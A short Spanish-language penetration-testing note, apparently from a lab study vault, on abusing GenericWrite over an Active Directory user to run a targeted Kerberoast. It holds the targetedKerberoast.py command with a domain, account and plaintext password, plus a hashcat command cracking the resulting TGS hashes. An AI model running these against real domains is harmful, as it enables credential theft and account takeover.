---
title: Generic Write Sobre Usuario — Targeted Kerberoast
tags: [ad, genericwrite, kerberoasting, targeted-kerberoast]
---

# Generic Write Sobre Usuario — Targeted Kerberoast

> [!tip] Cuándo usarlo
> Si tienes **GenericWrite** sobre un usuario puedes hacer un **Targeted Kerberoast**: añadir un SPN temporal al usuario objetivo, solicitar su TGS y crackearlo.

## Herramienta: targetedKerberoast

```bash
python3 targetedKerberoast.py -v -d 'hokkaido-aerospace.com' -u 'hrapp-service' -p 'Untimed$Runny'
```

Repo: https://github.com/ShutdownRepo/targetedKerberoast

## Crackear el hash

```bash
sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

## Ver también
- [[Kerberoasting]]
- [[Force Password Change]]
